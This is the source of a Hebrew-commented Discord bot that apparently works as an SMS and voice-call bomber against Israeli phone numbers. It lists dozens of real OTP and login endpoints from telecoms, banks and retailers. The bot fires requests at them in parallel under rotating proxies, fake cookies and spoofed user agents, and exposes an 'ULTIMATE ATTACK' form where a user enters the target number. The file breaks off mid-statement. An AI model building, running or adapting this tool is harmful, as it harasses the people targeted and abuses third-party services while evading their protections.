import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import itertools
import time
import hashlib
import secrets
import urllib.parse
import ssl
import certifi
from collections import deque
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== PROXY MANAGER מתקדם ==========
class ProxyManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.proxy_stats = {p: {"success": 0, "fail": 0, "last_used": 0} for p in self.proxies}
        self.current_proxy = None
        self.lock = asyncio.Lock()
        self.last_rotation = time.time()
        self.rotation_interval = 10
    
    def _load_proxies(self):
        """טעינת פרוקסים - רשימה ענקית"""
        proxies = []
        # פרוקסים ישראליים
        for i in range(100, 250, 2):
            proxies.append(f"http://185.162.230.{i}:80")
            proxies.append(f"http://185.162.231.{i}:80")
        
        for i in range(26, 250, 32):
            proxies.append(f"http://103.153.39.{i}:80")
        
        # פרוקסים בינלאומיים
        proxies.extend([
            "http://51.79.172.203:3128", "http://51.79.173.62:3128", "http://51.79.173.144:3128",
            "http://128.199.188.61:3128", "http://128.199.188.62:3128", "http://128.199.188.63:3128",
            "http://167.99.172.167:3128", "http://167.99.172.168:3128", "http://167.99.172.169:3128",
            "http://159.65.230.46:8888", "http://159.65.230.47:8888", "http://159.65.230.48:8888",
        ])
        return proxies
    
    async def get_proxy(self):
        async with self.lock:
            if time.time() - self.last_rotation > self.rotation_interval:
                self.current_proxy = None
                self.last_rotation = time.time()
            
            if self.current_proxy and self.proxy_stats[self.current_proxy]["fail"] < 2:
                return self.current_proxy
            
            # מציאת הפרוקסי הכי טוב
            best_proxy = None
            best_score = -1
            
            for proxy, stats in self.proxy_stats.items():
                total = stats["success"] + stats["fail"]
                if total > 0:
                    score = (stats["success"] / total) * 100 - stats["fail"] * 5
                    if score > best_score and stats["fail"] < 3:
                        best_score = score
                        best_proxy = proxy
            
            if best_proxy:
                self.current_proxy = best_proxy
                return best_proxy
            
            self.current_proxy = random.choice(self.proxies)
            return self.current_proxy
    
    async def report_success(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["success"] += 1
    
    async def report_failure(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["fail"] += 1

# ========== COOKIE CLEANER ==========
class CookieCleaner:
    def __init__(self):
        self.cookies = {}
        self.last_cleanup = time.time()
    
    def generate_fresh_cookies(self, domain):
        """מייצר קוקיז חדשים לגמרי"""
        return {
            f"session_{domain}": secrets.token_hex(16),
            f"csrf_{domain}": secrets.token_hex(8),
            f"visitor_{domain}": str(random.randint(1000000, 9999999)),
            "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
            "_gid": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
            "_gat": "1",
            "remember_me": secrets.token_hex(8),
            "tracking": str(random.randint(10000, 99999))
        }
    
    def get_headers_with_cookies(self, domain):
        """מחזיר headers עם קוקיז רעננים"""
        if time.time() - self.last_cleanup > 30:  # מנקה כל 30 שניות
            self.cookies = {}
            self.last_cleanup = time.time()
        
        if domain not in self.cookies:
            self.cookies[domain] = self.generate_fresh_cookies(domain)
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies[domain].items()])
        return {
            "Cookie": cookie_str,
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        }

# ========== BOT CLASS ==========
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.proxy_manager = ProxyManager()
        self.cookie_cleaner = CookieCleaner()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE - MEGA ULTIMATE EDITION")

bot = CyberBot()

# ========== USER AGENTS ענק ==========
USER_AGENTS = [
    # Chrome Windows
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,146)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,146)}.0.0.0 Safari/537.36 Edg/{random.randint(100,120)}.0.0.0",
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(100,123)}.0) Gecko/20100101 Firefox/{random.randint(100,123)}.0",
    
    # Chrome Mac
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(12,15)}_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,146)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{random.randint(12,15)}; rv:{random.randint(100,123)}.0) Gecko/20100101 Firefox/{random.randint(100,123)}.0",
    
    # Mobile
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(14,17)}.0 Mobile/15E148 Safari/604.1",
    f"Mozilla/5.0 (iPad; CPU OS {random.randint(14,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(14,17)}.0 Mobile/15E148 Safari/604.1",
    f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,146)}.0.0.0 Mobile Safari/537.36",
    f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,146)}.0.0.0 Mobile Safari/537.36",
    
    # Bots
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

# ========== CELLCOM API (מהדוגמה) ==========
CELLCOM_API = {
    "name": "Cellcom_OTP",
    "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1",
    "method": "PUT",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
        "Content-Type": "application/json",
        "Origin": "https://cellcom.co.il",
        "Referer": "https://cellcom.co.il/",
        "clientid": "CellcomWebApp",
        "deviceid": lambda: "web_" + secrets.token_hex(16),
        "sessionid": lambda: "sess_" + secrets.token_hex(24),
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    },
    "data": {"phone": "PHONE"}
}

# ========== MAGENTO APIS (55 אתרים) ==========
MAGENTO_APIS = [
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "AdikaStyle", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "ShoesMarket", "url": "https://www.shoesmarket.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tamman", "url": "https://www.tamman.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "ModaChild", "url": "https://www.moda-child.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Yangogo", "url": "https://www.yangogo.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Kapara", "url": "https://www.kapara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "BellaBaby", "url": "https://www.bellababy.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Pashosh", "url": "https://www.pashosh.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Sportwear", "url": "https://www.sportwear.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Running", "url": "https://www.running.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UrbanPlace", "url": "https://www.urbanplace.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "AmericanVintage", "url": "https://www.american-vintage.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tommy", "url": "https://www.tommyhilfiger.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CalvinKlein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UnderArmour", "url": "https://www.underarmour.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Columbia", "url": "https://www.columbia.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Merrell", "url": "https://www.merrell.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NewBalance", "url": "https://www.newbalance.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Converse", "url": "https://www.converse.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Vans", "url": "https://www.vans.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Asics", "url": "https://www.asics.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Reebok", "url": "https://www.reebok.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Musings", "url": "https://www.musings.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buyme", "url": "https://www.buyme.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Accessorize", "url": "https://www.accessorize.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Mango", "url": "https://www.mango.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Zara", "url": "https://www.zara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "HM", "url": "https://www.hm.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Bershka", "url": "https://www.bershka.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "PullBear", "url": "https://www.pullandbear.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Stradivarius", "url": "https://www.stradivarius.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Oysho", "url": "https://www.oysho.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "MassimoDutti", "url": "https://www.massimodutti.co.il/customer/ajax/post/", "type": "magento"},
]

# ========== SMS APIS (40+) ==========
SMS_APIS = [
    CELLCOM_API,
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "012", "url": "https://www.012.net.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "HOT_Telecom", "url": "https://www.hot.net.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Golan", "url": "https://www.golantelecom.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Be", "url": "https://www.be.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE", "method": "GET", "type": "get"},
    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "method": "POST", "type": "form", "data": "phone=PHONE"},
    {"name": "Agva", "url": "https://www.agva.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "method": "POST", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "method": "POST", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
    {"name": "Moovit", "url": "https://moovit.com/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "data": {"phoneNumber": "PHONE"}},
]

# ========== VOICE APIS (30+) ==========
VOICE_APIS = [
    {"name": "Hapoalim_Voice", "url": "https://login.bankhapoalim.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi_Voice", "url": "https://api.leumi.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Discount_Voice", "url": "https://api.discountbank.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi_Voice", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Beinleumi_Voice", "url": "https://api.beinleumi.co.il/auth/send-otp", "method": "POST", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Union_Voice", "url": "https://api.unionbank.co.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem_Voice", "url": "https://api.bank-jerusalem.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Massad_Voice", "url": "https://api.massad.co.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Yahav_Voice", "url": "https://api.yahav.co.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Otsar_Voice", "url": "https://api.otsar.org.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Postal_Voice", "url": "https://www.israelpost.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "OneZero_Voice", "url": "https://api.one-zero.com/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Cellcom_Voice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Partner_Voice", "url": "https://www.partner.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pelephone_Voice", "url": "https://www.pelephone.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hot_Voice", "url": "https://www.hotmobile.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "019_Voice", "url": "https://019sms.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "012_Voice", "url": "https://www.012.net.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Bezeq_Voice", "url": "https://www.bezeq.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Golan_Voice", "url": "https://www.golantelecom.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal_Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "method": "POST", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi_Voice", "url": "https://www.rami-levy.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pango_Voice", "url": "https://api.pango.co.il/auth/voice", "method": "POST", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Gett_Voice", "url": "https://www.gett.com/il/api/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hopon_Voice", "url": "https://api.hopon.co.il/v0.15/1/isr/users/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Clal_Voice", "url": "https://api.clalbit.co.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Harel_Voice", "url": "https://api.harel-group.co.il/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Menora_Voice", "url": "https://api.menora.co.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Phoenix_Voice", "url": "https://api.phoenix.co.il/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Migdal_Voice", "url": "https://api.migdal.co.il/auth/otp/voice", "method": "POST", "data": {"phone": "PHONE"}},
]

# שילוב הכל
ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS
TOTAL_APIS = len(ALL_APIS)
MAGENTO_COUNT = len(MAGENTO_APIS)
SMS_COUNT = len(SMS_APIS)
VOICE_COUNT = len(VOICE_APIS)

logging.info(f"📊 Loaded {TOTAL_APIS} APIs ({MAGENTO_COUNT} Magento, {SMS_COUNT} SMS, {VOICE_COUNT} Voice)")

# ========== פונקציות שליחה מהירות ==========
async def send_magento_fast(session, url, phone_raw, proxy):
    """שליחת מג'נטו מהירה"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    
    # מוסיף קוקיז
    domain = url.split('/')[2]
    headers.update(bot.cookie_cleaner.get_headers_with_cookies(domain))
    
    try:
        async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=1.5) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api_fast(session, api, phone, phone_raw, proxy):
    """שליחת API מהירה"""
    try:
        domain = api["url"].split('/')[2]
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        
        if "headers" in api:
            for k, v in api["headers"].items():
                if callable(v):
                    headers[k] = v()
                else:
                    headers[k] = v
        
        # מוסיף קוקיז
        headers.update(bot.cookie_cleaner.get_headers_with_cookies(domain))
        
        method = api.get("method", "POST").lower()
        
        if api.get("type") == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = api["data"].replace("PHONE", phone)
            async with session.request(method, api["url"], data=data, headers=headers, proxy=proxy, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
        
        elif api.get("type") == "get":
            url = api["url"].replace("PHONE", phone)
            async with session.get(url, headers=headers, proxy=proxy, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
        
        elif api.get("type") == "magento":
            return await send_magento_fast(session, api["url"], phone_raw, proxy)
        
        else:  # json
            if "data" in api:
                headers["Content-Type"] = "application/json"
                data_str = json.dumps(api["data"])
                data_str = data_str.replace("PHONE", phone)
                data_str = data_str.replace("PHONE_RAW", phone_raw)
                data = json.loads(data_str)
            else:
                data = {}
            
            async with session.request(method, api["url"], json=data, headers=headers, proxy=proxy, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפת על ==========
async def ultimate_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """מתקפה כוללת"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    last_update = 0
    
    # בחירת APIs
    if attack_type == "magento":
        apis = MAGENTO_APIS
        api_name = "MAGENTO"
    elif attack_type == "sms":
        apis = SMS_APIS
        api_name = "SMS"
    elif attack_type == "voice":
        apis = VOICE_APIS
        api_name = "VOICE"
    else:
        apis = ALL_APIS
        api_name = "ULTIMATE"
    
    await interaction.followup.send(
        f"💥 **{api_name} ATTACK!**\n"
        f"📱 {phone}\n"
        f"⏱️ {duration_mins} דקות\n"
        f"🎯 {len(apis)} APIs",
        ephemeral=True
    )
    
    logging.info(f"🚀 {api_name} attack started - {len(apis)} APIs")
    
    # 40 סשנים
    sessions = [aiohttp.ClientSession() for _ in range(40)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            rounds += 1
            tasks = []
            proxy = await bot.proxy_manager.get_proxy()
            
            for session in sessions:
                for api in apis:
                    if api.get("type") == "magento":
                        tasks.append(send_magento_fast(session, api["url"], phone_raw, proxy))
                    else:
                        tasks.append(send_api_fast(session, api, phone, phone_raw, proxy))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            # עדכון פרוקסי
            if round_sent > len(apis) * 5:
                await bot.proxy_manager.report_success(proxy)
            else:
                await bot.proxy_manager.report_failure(proxy)
            
            # עדכון כל 3 שניות
            seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
            if seconds > last_update and seconds % 3 == 0:
                last_update = seconds
                rate = total_sent // seconds if seconds > 0 else 0
                await interaction.followup.send(f"📊 {seconds}s: {total_sent} | {rate}/s", ephemeral=True)
            
            await asyncio.sleep(0.03)  # 30ms
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    seconds = int((end_time - (end_time - timedelta(minutes=duration_mins))).total_seconds())
    avg_rate = total_sent // seconds if seconds > 0 else 0
    
    await interaction.followup.send(
        f"✅ **FINISHED!**\n📊 סה\"כ: {total_sent}\n⚡ ממוצע: {avg_rate}/s",
        ephemeral=True
    )
    
    logging.info(f"✅ Attack ended - Total: {total_sent}, Rate: {avg_rate}/s")

# ========== פקודת בדיקה ==========
@bot.tree.command(name="check", description="בדוק APIs")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 מתחיל בדיקה...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    results = []
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(ALL_APIS[:30]):  # בודק 30 ראשונים
            if api.get("type") == "magento":
                success = await send_magento_fast(session, api["url"], test_raw, None)
            else:
                success = await send_api_fast(session, api, test_phone, test_raw, None)
            
            if success:
                results.append(api["name"])
            
            if i % 10 == 0:
                await interaction.followup.send(f"🔄 {i}/30", ephemeral=True)
    
    await interaction.followup.send(f"✅ **{len(results)}** עובדים:\n" + "\n".join(results[:15]), ephemeral=True)

@bot.tree.command(name="stop", description="עצור הכל")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped}", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💥 ULTIMATE ATTACK"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3", placeholder="1-30")
    attack_type = ui.TextInput(label="🎯 סוג", default="all", placeholder="all/sms/voice/magento")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        if attack_type not in ["all", "sms", "voice", "magento"]:
            await interaction.response.send_message("❌ סוג לא תקין", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 100000})
            user_doc = {"tokens": 100000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"💥 **ACTIVATED!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(ultimate_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💥 ULTIMATE", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 1000000})
        tokens = 1000000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="💥 ULTIMATE EDITION",
